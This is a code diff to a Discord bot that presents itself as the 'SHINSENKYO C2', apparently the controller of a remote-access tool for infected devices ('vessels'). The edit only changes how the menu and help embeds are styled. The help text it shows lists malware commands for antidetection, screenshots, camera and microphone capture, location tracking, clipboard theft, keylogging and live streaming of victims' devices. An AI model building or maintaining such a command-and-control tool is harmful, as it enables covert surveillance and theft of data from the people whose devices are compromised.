@@ -246,10 +246,11 @@ function menuEmbed() {
   const onlineCount = [...deviceStatus.values()].filter(s => s.online === true).length
   const totalDevices = deviceStatus.size
   return {
-    embeds: [new EmbedBuilder()
+    embeds: [
+      new EmbedBuilder().setColor(C.void).setImage(randGif()),
+      new EmbedBuilder()
       .setColor(C.blood)
       .setTitle(`${E.torii} SHINSENKYO C2 ${E.sakura}`)
-      .setImage(randGif())
       .setDescription(
         `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
         `**${E.ghost} Vessels** — ${onlineCount} flowing · ${totalDevices - onlineCount} fallen\n` +
@@ -277,10 +278,11 @@ function menuEmbed() {
 
 function helpEmbed() {
   return {
-    embeds: [new EmbedBuilder()
+    embeds: [
+      new EmbedBuilder().setColor(C.void).setImage(randGif()),
+      new EmbedBuilder()
       .setColor(C.blood)
       .setTitle(`${E.torii} SHINSENKYO — COMMAND GRIMOIRE`)
-      .setImage(randGif())
       .setDescription(
         `**${E.target} RECON**\n\`!ping\` \`!sysinfo\` \`!antidetect\` \`!ip\` \`!uptime\` \`!status\` \`!debug\`\n\n` +
         `**${E.eye} SURVEILLANCE**\n\`!screenshot\` \`!camera\` \`!mic\` \`!location\` \`!clipboard\` \`!keylog\` \`!stream\`\n\n` +
@@ -1563,7 +1565,7 @@ client.once(Events.ClientReady, async () => {
 
 
 
-  client.user.setActivity('⛩️ SHINSENKYO awaiting vessels | !help', { type: 3 }).catch(() => {})
+  try { client.user.setActivity('⛩️ SHINSENKYO awaiting vessels | !help', { type: 3 }) } catch {}
 
   // Set bot avatar to a random Hell's Paradise GIF
   try {
